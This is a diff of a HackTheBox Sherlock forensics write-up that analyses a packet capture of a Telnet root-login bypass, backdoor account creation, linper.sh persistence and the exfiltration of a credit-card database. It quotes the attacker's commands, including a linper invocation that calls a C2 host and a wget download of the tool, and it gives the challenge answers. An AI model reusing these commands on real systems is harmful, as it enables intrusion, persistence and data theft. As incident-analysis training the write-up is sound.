@@ -1,6 +1,3 @@
----
-
-```markdown
 # Telly — HackTheBox Sherlock Writeup
 
 **Prepared by:** Djibril Gathoni  
@@ -30,6 +27,8 @@
 
 ### Extracting the Artifact
 
+![Telly zip contents](screenshots/unzipped_telly.png)
+
 Download `Telly.zip` from the HTB Sherlock page, then extract it 
 using the HTB-provided password:
 
@@ -38,19 +37,13 @@ cd ~/Downloads/telly
 unzip Telly.zip
 ```
 
-**Result:**
-```
-Archive: Telly.zip
-  creating: Telly/
-[Telly.zip] Telly/monitoringservice_export_202610AM-11AM.pcapng password:
-  inflating: Telly/monitoringservice_export_202610AM-11AM.pcapng
-```
-
 Open the PCAP in Wireshark:
 
 ```bash
 wireshark Telly/monitoringservice_export_202610AM-11AM.pcapng
 ```
+
+![Wireshark opened](screenshots/Telly_1.png)
 
 ---
 
@@ -63,20 +56,16 @@ in the Telnet protocol?**
 
 **Answer: `CVE-2026-24061`**
 
-Filter for Telnet traffic in Wireshark:
+![Task 1](screenshots/Task_1.png)
 
-```
+Filter for Telnet traffic in Wireshark: 
 tcp.port == 23
-```
 
 Right-click any Telnet packet → **Follow → TCP Stream** (Stream 14).
 
 At the very top of the stream, the exploitation technique is 
 immediately visible:
-
-```
 USER.-f root.DISPLAY.kali:0.0.....XTERM-256COLOR
-```
 
 The attacker passed `-f root` as the `NEW-ENVIRON USER` value via 
 the Telnet option negotiation. This tricks the `login` binary into 
@@ -93,16 +82,13 @@ granting the attacker remote root access?**
 
 **Answer: `2026-01-27 10:39:28`**
 
+![Task 2](screenshots/Task_2.png)
+
 Following TCP Stream 14, the Ubuntu MOTD banner confirms the 
 moment the root shell was granted:
-
-```
 Linux 6.8.0-90-generic (backup-secondary) (pts/1)
-
 "Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)"
-
 System information as of Tue Jan 27 10:39:28 UTC 2026
-```
 
 The system timestamp printed at login — `2026-01-27 10:39:28` — 
 marks the exact moment the attacker gained root access.
@@ -112,6 +98,8 @@ marks the exact moment the attacker gained root access.
 **Task 3: What is the hostname of the targeted server?**
 
 **Answer: `backup-secondary`**
+
+![Task 3](screenshots/Task_3.png)
 
 The hostname appears in two places within the TCP stream:
 
@@ -127,6 +115,8 @@ access. What username and password were set for that account?**
 
 **Answer: `cleanupsvc:YouKnowWhoiam69`**
 
+![Task 4](screenshots/Question_4.png)
+
 Still within TCP Stream 14, the attacker ran the following command:
 
 ```bash
@@ -140,10 +130,9 @@ to avoid detection during a casual review of system users.
 
 The account creation is later confirmed in the `/etc/shadow` dump 
 the attacker performed:
-
-```
-cleanupsvc:$y$j9T$Z2NfVyVsu8gxGb1aZtCRr.$Ed0czry6Sp...:20480:0:99999:7:::
-```
+cleanupsvc:yy
+yj9TZ2NfVyVsu8gxGb1aZtCRr.Z2NfVyVsu8gxGb1aZtCRr.
+Z2NfVyVsu8gxGb1aZtCRr.Ed0czry6Sp...:20480:0:99999:7:::
 
 The epoch date `20480` is one day after all legitimate accounts 
 (`20479`), further confirming it was created during the intrusion.
@@ -156,9 +145,9 @@ The epoch date `20480` is one day after all legitimate accounts
 the persistence script?**
 
 **Answer:**
-```
 wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
-```
+
+![Task 5](screenshots/Question_5.png)
 
 After establishing the backdoor account, the attacker downloaded 
 the open-source Linux persistence framework **linper.sh** from 
@@ -177,22 +166,17 @@ the persistence script. What is the C2 IP address?**
 
 **Answer: `91.99.25.54`**
 
+![Task 6](screenshots/Task_6.png)
+
 The attacker ran linper.sh with the C2 IP and port as arguments:
 
 ```bash
 bash linper.sh 91.99.25.54 --p 59 --stealth-mode
 ```
 
-This is confirmed in the packet data — frame 6417 shows the C2 IP 
-being echoed back in the Telnet stream:
-
-```
-Data: \033[7m91.99.25.54\033[27m
-```
-
-The `--stealth-mode` flag instructed linper to:
-- Timestomp all modified persistence files
-- Install persistence across multiple vectors simultaneously
+The `--stealth-mode` flag instructed linper to timestomp all 
+modified persistence files and install persistence across multiple 
+vectors simultaneously.
 
 Persistence was installed across the following locations using 
 `awk`, `bash`, `nc`, `perl`, `python3`, `pwsh`, and `telnet`:
@@ -214,12 +198,13 @@ At what time was this file exfiltrated?**
 
 **Answer: `2026-01-27 10:49:54`**
 
+![Task 7](screenshots/Task_7.png)
+
+![Wireshark port 6932](screenshots/Wireshark.png)
+
 After establishing persistence, the attacker navigated to `/opt` 
 and found a sensitive database:
-
-```
 /opt/credit-cards-25-blackfriday.db
-```
 
 They served it over HTTP using Python's built-in HTTP server on 
 port 6932:
@@ -229,16 +214,12 @@ python3 -m http.server 6932
 ```
 
 Filtering for `tcp.port == 6932` in Wireshark reveals the 
-exfiltration event. Frame 9377 contains the HTTP access log 
-entry in the Telnet data stream confirming the exact timestamp:
-
-```
-192.168.72.131 - - [27/Jan/2026 10:49:54] 
+exfiltration event. The HTTP access log entry confirms the 
+exact timestamp:
+192.168.72.131 - - [27/Jan/2026 10:49:54]
 "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
-```
 
-The attacker then deleted the file and attempted to clean up 
-evidence before exiting.
+The attacker then deleted the file to cover their tracks.
 
 ---
 
@@ -247,10 +228,10 @@ Quinn Harris.**
 
 **Answer: `5312269047781209`**
 
-The database was carved from the PCAP via **File → Export Objects 
-→ HTTP** in Wireshark, saving `credit-cards-25-blackfriday.db`.
+![Task 8](screenshots/Last_question.png)
 
-Analyzing the database:
+The database was carved from the PCAP via 
+**File → Export Objects → HTTP** in Wireshark.
 
 ```bash
 sqlite3 credit-cards-25-blackfriday.db
@@ -272,33 +253,30 @@ Quinn Harris's credit card number: **`5312269047781209`**
 ---
 
 ## 4. Attack Chain Summary
-
-```
 [Attacker: 192.168.72.131]
-        |
-        | Telnet to port 23
-        | NEW-ENVIRON USER = "-f root" (CVE-2026-24061)
-        |
-        v
+|
+| Telnet to port 23
+| NEW-ENVIRON USER = "-f root" (CVE-2026-24061)
+|
+v
 [Target: backup-secondary (192.168.72.136)]
-        |
-        | Root shell granted — 2026-01-27 10:39:28
-        |
-        |— Backdoor account created: cleanupsvc:YouKnowWhoiam69
-        |
-        |— linper.sh downloaded from GitHub
-        |   Persistence installed across cron, systemd, rc.local
-        |   C2: 91.99.25.54:59 (stealth mode, timestomped)
-        |
-        |— /opt/credit-cards-25-blackfriday.db discovered
-        |   Served via python3 HTTP server on port 6932
-        |   Exfiltrated at 2026-01-27 10:49:54
-        |
-        |— Database deleted to cover tracks
-        |
-        v
+|
+| Root shell granted — 2026-01-27 10:39:28
+|
+|— Backdoor account created: cleanupsvc:YouKnowWhoiam69
+|
+|— linper.sh downloaded from GitHub
+|   Persistence installed across cron, systemd, rc.local
+|   C2: 91.99.25.54:59 (stealth mode, timestomped)
+|
+|— /opt/credit-cards-25-blackfriday.db discovered
+|   Served via python3 HTTP server on port 6932
+|   Exfiltrated at 2026-01-27 10:49:54
+|
+|— Database deleted to cover tracks
+|
+v
 [Attacker exits — persistence mechanisms remain active]
-```
 
 ---
 
@@ -340,7 +318,7 @@ Quinn Harris's credit card number: **`5312269047781209`**
 |---------|---------------|
 | Telnet exposed on port 23 | Disable telnetd immediately. Migrate to SSH. |
 | CVE-2026-24061 | Patch or replace the vulnerable telnetd binary. |
-| Backdoor account (cleanupsvc) | Remove account, audit all user accounts, enforce account creation monitoring. |
+| Backdoor account (cleanupsvc) | Remove account, audit all users, enforce account creation monitoring. |
 | Cron/systemd persistence | Audit all cron files and systemd units for unauthorized entries. |
 | C2 communication to 91.99.25.54 | Block IP at firewall, review egress filtering policy. |
 | Sensitive data in /opt | Review data storage policies. Sensitive databases should not reside on backup servers. |
@@ -369,7 +347,5 @@ Quinn Harris's credit card number: **`5312269047781209`**
 - [linper.sh — Linux Persistence Framework](https://github.com/montysecurity/linper)
 - [MITRE ATT&CK Framework](https://attack.mitre.org/)
 - [Wireshark Documentation](https://www.wireshark.org/docs/)
-```
 
----
 
